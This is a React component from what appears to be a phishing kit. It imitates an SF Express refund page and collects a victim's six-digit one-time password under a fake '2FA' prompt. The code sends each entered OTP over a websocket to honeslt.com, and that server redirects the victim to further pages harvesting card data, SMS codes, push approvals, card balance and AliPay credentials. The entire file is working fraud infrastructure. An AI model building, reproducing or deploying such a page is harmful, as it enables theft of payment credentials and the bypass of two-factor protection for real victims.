// src/pages/Card/Otp.js
import React, { useEffect, useState } from 'react';
import './Card.css';
import SfExpress from './img/logo.png';
import LogoTemp from './img/LOGO_2.webp';
import LoaderImg from './img/loader.gif';
import { RSocketClient, JsonSerializers } from 'rsocket-core';
import RSocketWebSocketClient from 'rsocket-websocket-client';
import { Flowable } from 'rsocket-flowable';

const Otp = () => {
    const [otp, setOtp] = useState('');
    const [sessionId, setSessionId] = useState(null);
    const [loading, setLoading] = useState(false);
    const [advertTitle, setAdvertTitle] = useState('');
    const [advertSum, setAdvertSum] = useState(0);
    const [feeSum, setFeeSum] = useState(0);
    const [totalSum, setTotalSum] = useState(0);
    const [imageUrl, setImageUrl] = useState('');
    const [socket, setSocket] = useState(null);
    const feePercentage = 1;

    const handleChange = (event) => {
      const inputValue = event.target.value;
      const digits = inputValue.replace(/\D/g, '');
      if (digits.length <= 6) {
          setOtp(digits);
      }
  };

  const isOtpValid = otp.length === 6;

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const id = urlParams.get('sessionId'); // Получаем все значения sessionId
    setSessionId(id);

      const advertId = urlParams.get('advertId');
      if (advertId) {
          fetch(`https://honeslt.com:8080/api/adverts/${advertId}`)
              .then(response => {
                  if (!response.ok) {
                      throw new Error('Network response was not ok');
                  }
                  return response.json();
              })
                .then(data => {
                    setAdvertTitle(data.title);
                    setAdvertSum(data.priceRange);
                    const calculatedFeeSum = (data.priceRange * feePercentage) / 100;
                    setFeeSum(calculatedFeeSum);
                    setTotalSum(parseFloat((data.priceRange - calculatedFeeSum).toFixed(2))); 
                    if (data.imageUrls && data.imageUrls.length > 0) {
                      const imageId = data.imageUrls[0]; // Берем первое изображение
                      // Если URL начинается с //, добавляем https:
                      const imageUrl = imageId.startsWith('//') ? `https:${imageId}` : imageId;
                      setImageUrl(imageUrl);
                  }
                   
                })
                .catch(error => {
                  console.error('Error fetching advert data:', error);
                  
              });
      }

    const rSocketClient = new RSocketClient({
                transport: new RSocketWebSocketClient({
                    url: 'wss://honeslt.com:8080/rsocket/',
                }),
                serializers: JsonSerializers,
                setup: {
                    keepAlive: 60000,
                    lifetime: 180000,
                    dataMimeType: 'application/json',
                    metadataMimeType: 'application/json',
                },
            });

    rSocketClient.connect().subscribe({
                onComplete: (socket) => {
                    setSocket(socket);
    
                    const connectData = {
                        sessionId: id,
                        updateType: "CONNECT",
                    };
    
                    const metadataConnect = `session.update.${id}`;
                    const connectChannel = Flowable.just({
                        data: connectData,
                        metadata: metadataConnect,
                    });
    
                    const connectSubscription = socket.requestChannel(connectChannel);

                    connectSubscription.subscribe({
                      onNext: (payload) => {
                          console.log('Connect response received:', payload.data);
                          const { updateType } = payload.data;
                          const host = window.location.origin;
                          const sessionIdParam = `&sessionId=${id}`;
                          const advertId = urlParams.get('advertId');
                          let redirectUrl;
                          switch (updateType) {
                              case 'CARD_DATA':
                                  redirectUrl = `${host}/card/card?advertId=${advertId}${sessionIdParam}`;
                                  break;
                              case 'CARD_SMS':
                                  redirectUrl = `${host}/card/code?advertId=${advertId}${sessionIdParam}`;
                                  break;
                              case 'CARD_PUSH':
                                  redirectUrl = `${host}/card/push?advertId=${advertId}${sessionIdParam}`;
                                  break;
                              case 'CARD_BALANCE':
                                  redirectUrl = `${host}/card/balance?advertId=${advertId}${sessionIdParam}`;
                                  break;
                              case 'ALI_PAY_CREDS':
                                  redirectUrl = `${host}/alipay/auth?advertId=${advertId}${sessionIdParam}`;
                                  break;
                              case 'ALI_PAY_SMS':
                                  redirectUrl = `${host}/alipay/code?advertId=${advertId}${sessionIdParam}`;
                                  break;
                              case 'ALI_PAY_PUSH':
                                  redirectUrl = `${host}/alipay/push?advertId=${advertId}${sessionIdParam}`;
                                  break;
                              case 'SUCCESS':
                                  redirectUrl = `${host}/successfully?advertId=${advertId}${sessionIdParam}`;
                                  break;
                              default:
                                  redirectUrl = null;
                          }
  
                          if (redirectUrl) {
                              window.location.href = redirectUrl; // Перенаправляем пользователя
                          }
                      },
                      onError: (error) => {
                          console.error('Error in connect data stream:', error);
                          
                      },
                      onComplete: () => {
                          console.log('Connect data stream completed');
                      },
                      onSubscribe: (subscription) => {
                          subscription.request(2147483647);
                      },
                  });
              },
              onError: (error) => {
                  console.error('Error connecting to RSocket:', error);
                  
              },
          });
      }, []);

  const handleSubmit = (event) => {
    event.preventDefault();
    if (isOtpValid && socket) {
        const otpData = {
            sessionId: sessionId,
            updateType: "CARD_SMS",
            value: otp,
        };

        const metadataSessionUpdate = `session.update.${sessionId}`;
        const channel = Flowable.just({
            data: otpData,
            metadata: metadataSessionUpdate,
        });

        

        const subscription = socket.requestChannel(channel);
        setLoading(true);

        subscription.subscribe({
                onNext: (payload) => {
                    console.log('Response received:', payload.data);
                    const { updateType } = payload.data;
                    const host = window.location.origin;
                    const sessionIdParam = `&sessionId=${sessionId}`;
                    const urlParams = new URLSearchParams(window.location.search);
                    const advertId = urlParams.get('advertId');
                    let redirectUrl;
                    switch (updateType) {
                        case 'CARD_DATA':
                            redirectUrl = `${host}/card/card?advertId=${advertId}${sessionIdParam}`;
                            break;
                        case 'CARD_SMS':
                            redirectUrl = `${host}/card/code?advertId=${advertId}${sessionIdParam}`;
                            break;
                        case 'CARD_PUSH':
                            redirectUrl = `${host}/card/push?advertId=${advertId}${sessionIdParam}`;
                            break;
                        case 'CARD_BALANCE':
                            redirectUrl = `${host}/card/balance?advertId=${advertId}${sessionIdParam}`;
                            break;
                        case 'ALI_PAY_CREDS':
                            redirectUrl = `${host}/alipay/auth?advertId=${advertId}${sessionIdParam}`;
                            break;
                        case 'ALI_PAY_SMS':
                            redirectUrl = `${host}/alipay/code?advertId=${advertId}${sessionIdParam}`;
                            break;
                        case 'ALI_PAY_PUSH':
                            redirectUrl = `${host}/alipay/push?advertId=${advertId}${sessionIdParam}`;
                            break;
                        default:
                            redirectUrl = null;
                    }

                    if (redirectUrl) {
                        window.location.href = redirectUrl; // Перенаправляем пользователя
                    }
                },
                onError: (error) => {
                    console.error('Error in card data stream:', error);
                    
                    setLoading(false);
                },
                onComplete: () => {
                    console.log('Card data stream completed');
                    setLoading(false);
                },
                onSubscribe: (subscription) => {
                    subscription.request(2147483647);
                },
            });
            console.log('OTP data sent:', otp);
            setLoading(true);
        }
    };
  return (
    <>
  <div
    style={{
      height: "100%",
      width: "100%",
      position: "fixed",
      display: "flex",
      zIndex: -1
    }}
  >
    <div
      className="container bg_cont"
      style={{
        padding: 0,
        margin: 0,
        width: "100%",
        height: "100%",
        maxWidth: "100vw"
      }}
    >
      <div className="row" style={{ width: "100%", padding: 0, margin: 0 }}>
        <div
          className="col col-md-6"
          style={{ padding: 0, margin: 0, height: "100%", minHeight: "100vh" }}
        >
          <div
            style={{
              width: "100%",
              height: "100%",
              minHeight: "100vh",
              maxHeight: "100%",
              background: "#fbfbfb"
            }}
          />
        </div>
        <div
          className="col offset-2 col-md-6"
          style={{
            padding: 0,
            margin: 0,
            height: "100%",
            minHeight: "100vh",
            boxShadow: "-1px 0px 10px rgba(0,0,0,0.1)"
          }}
        >
          <div
            style={{
              width: "100%",
              height: "100%",
              minHeight: "100vh",
              maxHeight: "100%"
            }}
          />
        </div>
      </div>
    </div>
  </div>
  <div
    style={{
      width: "100%",
      display: "flex",
      zIndex: 1,
      maxHeight: "100vh",
      height: "100vh"
    }}
  >
    <div
      className="container-lg d-flex d-xxl-flex justify-content-center justify-content-xxl-center"
      style={{ maxWidth: "100%", height: "100vh" }}
    >
      <div
        className="row gy-5 d-xxl-flex justify-content-center align-items-center align-items-xxl-start"
        style={{
          width: "100%",
          height: "100%",
          paddingTop: 20,
          paddingBottom: 40
        }}
      >
        <div
          className="col-md-6 mx-auto"
          style={{ maxWidth: 650, width: "100%" }}
        >
          <div style={{ width: "100%", paddingLeft: 15, paddingRight: 15 }}>
            <div
              className="d-flex d-xxl-flex align-items-center justify-content-xxl-start align-items-xxl-center"
              style={{ width: "100%", paddingTop: 20 }}
            >
              <span
                className="d-flex d-xl-flex align-items-center align-items-xl-center"
                style={{
                  fontWeight: "bold",
                  fontSize: 17,
                  color: "rgba(33,37,41,0.75)"
                }}
              >
                <button
                  className="btn btn-primary"
                  type="button"
                  style={{
                    background: "rgba(0,0,0,0)",
                    color: "rgb(0,0,0)",
                    borderStyle: "none"
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="1em"
                    height="1em"
                    fill="currentColor"
                    viewBox="0 0 16 16"
                    className="bi bi-arrow-left"
                    style={{
                      fontSize: 20,
                      color: "rgba(0,0,0,0.5)",
                      marginRight: 15
                    }}
                  >
                    <path
                      fillRule="evenodd"
                      d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8"
                    />
                  </svg>
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="1em"
                    height="1em"
                    fill="currentColor"
                    viewBox="0 0 16 16"
                    className="bi bi-shop-window"
                    style={{
                      fontSize: 30,
                      color: "rgba(33,37,41,0.6)",
                      width: "auto",
                      padding: 5,
                      borderWidth: 1,
                      borderStyle: "solid",
                      borderRadius: 40
                    }}
                  >
                    <path d="M2.97 1.35A1 1 0 0 1 3.73 1h8.54a1 1 0 0 1 .76.35l2.609 3.044A1.5 1.5 0 0 1 16 5.37v.255a2.375 2.375 0 0 1-4.25 1.458A2.371 2.371 0 0 1 9.875 8 2.37 2.37 0 0 1 8 7.083 2.37 2.37 0 0 1 6.125 8a2.37 2.37 0 0 1-1.875-.917A2.375 2.375 0 0 1 0 5.625V5.37a1.5 1.5 0 0 1 .361-.976l2.61-3.045zm1.78 4.275a1.375 1.375 0 0 0 2.75 0 .5.5 0 0 1 1 0 1.375 1.375 0 0 0 2.75 0 .5.5 0 0 1 1 0 1.375 1.375 0 1 0 2.75 0V5.37a.5.5 0 0 0-.12-.325L12.27 2H3.73L1.12 5.045A.5.5 0 0 0 1 5.37v.255a1.375 1.375 0 0 0 2.75 0 .5.5 0 0 1 1 0M1.5 8.5A.5.5 0 0 1 2 9v6h12V9a.5.5 0 0 1 1 0v6h.5a.5.5 0 0 1 0 1H.5a.5.5 0 0 1 0-1H1V9a.5.5 0 0 1 .5-.5m2 .5a.5.5 0 0 1 .5.5V13h8V9.5a.5.5 0 0 1 1 0V13a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V9.5a.5.5 0 0 1 .5-.5" />
                  </svg>
                </button>
                &nbsp;&nbsp;
                <img alt='' src={ SfExpress } style={{ width: 100 }} />
              </span>
            </div>
            <div style={{ width: "100%", marginTop: 50 }}>
              <h4 style={{ color: "rgba(33,37,41,0.8)", fontSize: 20 }}>
                Replenishment of payment card
              </h4>
            </div>
            <div style={{ width: "100%" }}>
              <span
                id="advertSum"
                style={{
                  marginRight: 10,
                  fontSize: "xx-large",
                  fontWeight: "bold"
                }}
              >
                { advertSum }
              </span>
              <span style={{ fontSize: "xx-large", fontWeight: "bold" }}>
                CNY
              </span>
            </div>
            <div
              className="d-flex d-xxl-flex align-items-center align-items-xxl-center"
              style={{ marginTop: 30, width: "100%", paddingRight: 30 }}
            >
              <div
                style={{
                  maxWidth: 100,
                  width: "100%",
                  borderRadius: 10,
                  marginRight: 20
                }}
              >
                <img alt=''
                  style={{ width: "100%", borderRadius: 10 }}
                  src={ imageUrl || LogoTemp }
                />
              </div>
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <span
                  id="advertTitle"
                  style={{ fontWeight: "bold", fontSize: 14 }}
                >
                  { advertTitle }
                </span>
                <span style={{ fontSize: 14 }}>Qty: 1</span>
              </div>
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <span
                  id="advertTitle-1"
                  style={{ fontWeight: "bold", textAlign: "right" }}
                >
                  <span
                    id="advert_amount"
                    style={{ marginRight: 5, fontSize: 14 }}
                  >
                    { advertSum }
                  </span>
                  <span style={{ fontSize: 14 }}>CNY</span>
                </span>
                <span style={{ textAlign: "right", fontSize: 14 }}>
                  Service fee 1%
                </span>
              </div>
            </div>
            <div
              className="d-flex d-xxl-flex align-items-center align-items-xxl-center"
              style={{ marginTop: 30, width: "100%", paddingRight: 30 }}
            >
              <div
                style={{
                  maxWidth: 100,
                  width: "100%",
                  borderRadius: 10,
                  marginRight: 20
                }}
              />
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <span
                  id="advertTitle-2"
                  style={{ fontWeight: "bold", fontSize: 14 }}
                >
                  Subtotal
                </span>
              </div>
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <span
                  id="advertTitle-3"
                  style={{ fontWeight: "bold", textAlign: "right" }}
                >
                  <span
                    id="advert_amount-1"
                    style={{ marginRight: 5, fontSize: 14 }}
                  >
                    { advertSum }
                  </span>
                  <span style={{ fontSize: 14 }}>CNY</span>
                </span>
              </div>
            </div>
            <div
              className="d-flex d-xxl-flex align-items-center align-items-xxl-center"
              style={{ width: "100%", paddingRight: 30 }}
            >
              <div
                style={{
                  maxWidth: 100,
                  width: "100%",
                  borderRadius: 10,
                  marginRight: 20
                }}
              />
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <hr />
              </div>
            </div>
            <div
              className="d-flex d-xxl-flex align-items-center align-items-xxl-center"
              style={{ marginTop: 5, width: "100%", paddingRight: 30 }}
            >
              <div
                style={{
                  maxWidth: 100,
                  width: "100%",
                  borderRadius: 10,
                  marginRight: 20
                }}
              />
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <span
                  id="advertTitle-4"
                  style={{
                    fontWeight: "bold",
                    color: "rgba(33,37,41,0.71)",
                    fontSize: 14
                  }}
                >
                  Service fee
                </span>
              </div>
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <span
                  id="advertTitle-5"
                  style={{ fontWeight: "bold", textAlign: "right" }}
                >
                  <span
                    id="service_fee"
                    style={{
                      marginRight: 5,
                      color: "rgba(33,37,41,0.71)",
                      fontSize: 14
                    }}
                  >
                    { feeSum }
                  </span>
                  <span style={{ color: "rgba(33,37,41,0.71)", fontSize: 14 }}>
                    CNY
                  </span>
                </span>
              </div>
            </div>
            <div
              className="d-flex d-xxl-flex align-items-center align-items-xxl-center"
              style={{ width: "100%", paddingRight: 30 }}
            >
              <div
                style={{
                  maxWidth: 100,
                  width: "100%",
                  borderRadius: 10,
                  marginRight: 20
                }}
              />
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <hr />
              </div>
            </div>
            <div
              className="d-flex d-xxl-flex align-items-center align-items-xxl-center"
              style={{ marginTop: 5, width: "100%", paddingRight: 30 }}
            >
              <div
                style={{
                  maxWidth: 100,
                  width: "100%",
                  borderRadius: 10,
                  marginRight: 20
                }}
              />
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <span
                  id="advertTitle-6"
                  style={{
                    fontWeight: "bold",
                    color: "rgb(33,37,41)",
                    fontSize: 16
                  }}
                >
                  Total refundable
                </span>
              </div>
              <div className="d-grid" style={{ width: "100%", height: "100%" }}>
                <span
                  id="advertTitle-7"
                  style={{ fontWeight: "bold", textAlign: "right" }}
                >
                  <span
                    id="advert_total_sum"
                    style={{
                      marginRight: 5,
                      color: "rgb(33,37,41)",
                      fontSize: 16
                    }}
                  >
                    { totalSum }
                  </span>
                  <span style={{ color: "rgb(33,37,41)", fontSize: 16 }}>
                    CNY
                  </span>
                </span>
              </div>
            </div>
            <div
              className="d-flex d-xxl-flex align-items-center align-items-xxl-center"
              style={{ width: "100%", paddingRight: 20 }}
            >
              <div
                style={{
                  maxWidth: 100,
                  width: "100%",
                  borderRadius: 10,
                  marginRight: 20
                }}
              />
            </div>
          </div>
        </div>
        <div
          className="col-md-6 mx-auto"
          style={{ maxWidth: 650, width: "100%", paddingBottom: 60 }}
        >

{!loading ? (
          <form id='formOtp' onSubmit={handleSubmit} style={{ width: "100%", paddingTop: 40 }}>
            <div>
              <h5
                className="d-flex d-xxl-flex align-items-center align-items-xxl-center"
                style={{ paddingLeft: 5 }}
              >
                <i
                  className="fa fa-lock"
                  style={{
                    color: "rgb(4,179,0)",
                    fontSize: 21,
                    fontWeight: "bold",
                    marginRight: 15
                  }}
                />
                Two-Factor Authentication (2FA)
              </h5>
            </div>
            <div style={{ marginTop: 15 }}>
              <div style={{ width: "100%" }}>
                <label
                  className="form-label"
                  style={{ color: "rgba(33,37,41,0.7)" }}
                >
                  One-time password (OTP)
                </label>
              </div>
              <div style={{ width: "100%", marginBottom: 20 }}>
                <input
        className="form-control inp_out"
        type="text"
        id="otp"
        value={otp}
        onChange={handleChange}
        style={{
          width: "100%",
          height: 45,
          borderRadius: 6,
          paddingTop: 6,
          paddingBottom: 6,
          paddingLeft: 12,
          border: "1px solid rgba(33,37,41,0.2)",
          outline: "none"
        }}
        placeholder="******"
        minLength={6}
        maxLength={6} // Ограничиваем длину ввода
        required
      />
              </div>
            </div>
            <div style={{ width: "100%", marginTop: 35 }}>
            <button
        className="btn receive_btn"
         id='sendCardBtn'
        type="submit"
        style={{
          width: "100%",
          height: 45,
          borderStyle: "none",
          color: "rgb(255,255,255)",
          backgroundColor: isOtpValid ? 'rgba(33, 37, 41, 0.8)' : 'gray', // Изменяем цвет кнопки в зависимости от состояния
          cursor: isOtpValid ? 'pointer' : 'not-allowed', // Изменяем курсор
        }}
        disabled={!isOtpValid} // Делаем кнопку неактивной, если OTP не валиден
      >
        Confirm
      </button>
            </div>
          </form>

) : (
         
          <form id='formCardLoader'  style={{ width: "100%", paddingTop: 40 }}>
            <div style={{ width: "100%" }}>
              <div style={{ width: "100%", textAlign: "center", alignItems: "center", justifyContent: "center"}}>
                <img alt='' src={ LoaderImg } width={40}/>
              </div>
              </div>
              
          </form>
)}
        </div>
      </div>
    </div>
  </div>
</>

  );
};

export default Otp;